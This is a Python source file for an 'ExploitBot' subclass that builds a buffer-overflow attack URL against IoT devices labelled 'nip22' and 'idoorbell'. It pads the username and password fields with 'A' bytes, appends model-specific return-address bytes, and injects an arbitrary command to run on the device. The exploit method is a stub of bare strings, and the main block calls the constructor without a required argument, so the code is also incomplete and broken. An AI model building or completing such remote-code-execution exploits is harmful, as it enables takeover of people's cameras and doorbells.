import os, time, sys, URLFunctions
from ExploitBot import ExploitBot


class HTTPBot(ExploitBot):

    def __init__(self, dbURL, webURL, hardwareModel):

        super(HTTPBot, self).__init__(dbURL, webURL)

        self.__hardwareModel = hardwareModel
        self._modelPassword = ""
        self._targetIP = ExploitBot.getTarget(self)
        self._targetURL = ""
        self._targetUserBuffer = "A" * 204
        self._targetPassword = "A" * 328

    def prepare_target(self, _model, _cmdToExecute):

        self._targetUserBuffer += _cmdToExecute

        if _model == "nip22":
            self._targetPassword += "\x64\x7B\x08"

        elif _model == "idoorbell":
            self._targetPassword += "\xD8\xED\x07"

        self._targetURL = "http://%s/?usr=%s&pwd=%s" % (self._targetIP, self._targetUserBuffer,
                                                        self._targetPassword)

    def exploit(self):

        if self._targetURL != "":
            "Executing Target Now..."
        else:
            "Before executing, make sure to prepare target first..."


if __name__ == "__main__":
    hello = HTTPBot(dbURL="1.2.3.4", webURL="4.5.6.7")
